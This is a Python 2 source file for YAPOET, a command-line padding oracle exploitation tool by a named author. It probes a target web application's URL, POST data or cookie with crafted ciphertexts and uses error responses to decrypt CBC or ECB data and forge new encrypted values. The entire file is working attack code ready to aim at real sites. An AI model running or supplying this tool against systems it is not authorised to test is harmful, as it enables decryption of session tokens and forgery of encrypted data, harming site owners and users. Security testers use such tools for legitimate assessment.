#!/usr/bin/env python

import base64, errno, optparse, random, urllib, urllib2

class Yapoet:
    def __init__(self, url, post_data, cookie, block_size, iv, mode):
        self._url = url
        self._post_data = post_data
        self._cookie = cookie
        self._block_size = block_size
        self._iv = iv
        self._mode = mode
        self._requests_count = 0

    def _is_valid_padding(self, encrypted_data):
        specify = lambda s: s.replace("%encrypted_data%", urllib.quote(base64.b64encode(encrypted_data))) if s else None
        url = specify(self._url)
        post_data = specify(self._post_data)
        cookie = specify(self._cookie)
        try:
            self._requests_count += 1
            urllib2.urlopen(urllib2.Request(url, post_data, {"Cookie": cookie}))
            return True
        except urllib2.HTTPError:
            return False
        except urllib2.URLError:
            print "\n\nERROR: host is unreachable"
            exit(errno.EHOSTUNREACH)

    def _decrypt_block(self, encrypted_block):
        probing_bytes = bytearray(b'\0' * self._block_size + encrypted_block)
        intermediate_bytes = bytearray(b'\0' * self._block_size)
        byte_index = self._block_size - 1
        while byte_index >= 0:
            padding_size = self._block_size - byte_index
            for j in range(byte_index + 1, self._block_size):
                probing_bytes[j] = intermediate_bytes[j] ^ padding_size
            probing_bytes[byte_index] = 1
            probes_count = 0
            while probes_count < 256:
                probes_count += 1
                if self._is_valid_padding(probing_bytes):
                    intermediate_bytes[byte_index] = probing_bytes[byte_index] ^ padding_size
                    print "%s," % hex(intermediate_bytes[byte_index]),
                    break
                else:
                    probing_bytes[byte_index] = probing_bytes[byte_index] + 1 if probes_count != 255 else 0
            byte_index -= 1
        return intermediate_bytes

    def decrypt_text(self, encrypted_data):
        self._requests_count = 0
        encrypted_bytes = base64.b64decode(encrypted_data)
        decrypted_data = ''
        block_index = len(encrypted_bytes) - self._block_size
        while block_index >= 0:
            print "\n\t\tProcessing block #%s:" % (block_index / self._block_size),
            cipher_block = encrypted_bytes[block_index: block_index + self._block_size]
            if block_index > 0:
                prev_block = encrypted_bytes[block_index - self._block_size: block_index]
            else:
                prev_block = self._iv
            decrypted_block = self._decrypt_block(cipher_block)
            for idx, val in enumerate(decrypted_block):
                decrypted_data = chr(val ^ prev_block[idx] if self._mode == "CBC" else val) + decrypted_data
            block_index -= self._block_size
        return decrypted_data[::-1].rstrip(decrypted_data[0]), self._requests_count

    def _encrypt_block(self, plain_block, iv):
        encrypted_block = bytearray(b'\0' * self._block_size)
        for idx, val in enumerate(self._decrypt_block(iv)):
            encrypted_block[idx] = val ^ plain_block[idx]
        return encrypted_block

    def encrypt_text(self, plain_data):
        self._requests_count = 0
        padding_length = self._block_size - len(plain_data) % self._block_size
        padded_data = plain_data.encode() + bytearray([padding_length] * padding_length)
        encrypted_text = bytearray()
        block_index = len(padded_data) - self._block_size
        iv = bytearray(random.getrandbits(8) for _ in xrange(self._block_size))
        while block_index >= 0:
            print "\n\t\tProcessing block #%s:" % (block_index / self._block_size),
            encrypted_text = iv + encrypted_text
            iv = self._encrypt_block(padded_data[block_index: block_index + self._block_size], iv)
            block_index -= self._block_size
        return base64.b64encode(iv + encrypted_text), self._requests_count

if __name__ == "__main__":

    print "YAPOET: Yet Another Padding Oracle Exploitation Tool v0.1.0"
    print "by Vladimir Kochetkov <kochetkov.vladimir@gmail.com>"
    print "https://github.com/kochetkov/Yapoet\n"

    parser = optparse.OptionParser()
    parser.add_option("-u", "--url", dest="url",
                      help="Target URL (e.g. \"http://host.domain/?param1=value%2b1&param2=value%2b2\")")
    parser.add_option("-d", "--decrypt", dest="encrypted_data", help="Base64-encoded data to decrypt")
    parser.add_option("-e", "--encrypt", dest="plaintext_data", help="Plaintext data to encrypt (CBC mode only)")
    parser.add_option("--data", dest="post_data", help="POST data (e.g. \"param1=value%2b1&param2=value%2b1\")")
    parser.add_option("--cookie", dest="cookie", help="HTTP Cookie header value")
    parser.add_option("--block-size", dest="block_size", help="Cipher block size [default: %default]")
    parser.add_option("--iv", dest="iv", help="Initialization vector (e.g. \"0x00,0x01,0x39...\") [default: 0x00 * BLOCK_SIZE]")
    parser.add_option("--mode", dest="mode", help="Mode of operation (e.g. \"ECB\" or \"CBC\") [default: %default]")
    parser.set_defaults(block_size=16, mode="CBC")
    options, _ = parser.parse_args()

    if options.url and (options.encrypted_data or options.plaintext_data):
        if options.iv:
            options_iv = bytearray([int(i, 0) for i in options.iv.split(",")])
            if len(options_iv) != options.block_size:
                print "IV length must be equal to the BLOCK_SIZE value"
                exit(errno.EINVAL)
        else:
            options_iv = bytearray(b'\0' * options.block_size)
        if options.mode != "ECB" and options.mode != "CBC":
                print "Possible values for MODE are only \"ECB\" and \"CBC\""
                exit(errno.EINVAL)
        poet = Yapoet(options.url, options.post_data, options.cookie, options.block_size, options_iv, options.mode)
        print "Using %s mode of operation, block size = %s bytes and IV = %s\n" % (options.mode, options.block_size, ''.join('{:02x}'.format(x) for x in options_iv))
        if options.encrypted_data:
            print "Started decryption of '''%s'''" % options.encrypted_data
            print "\n\nData has been decrypted to '''%s''' via %s requests\n" % poet.decrypt_text(options.encrypted_data)
        if options.plaintext_data:
            if options.mode != "CBC":
                    print "Encryption is possible only in CBC mode"
                    exit(errno.EINVAL)
            print "Started encryption of '''%s'''" % options.plaintext_data
            print "\n\nData has been encrypted to '''%s''' via %s requests" % poet.encrypt_text(options.plaintext_data)
    else:
        parser.print_help()
        print "\nPlease note that the value of at least one of the HTTP-request parameters in\n" \
              "the URL, POST_DATA or COOKIE options should be replaced with an\n" \
              "%encrypted_data% placeholder."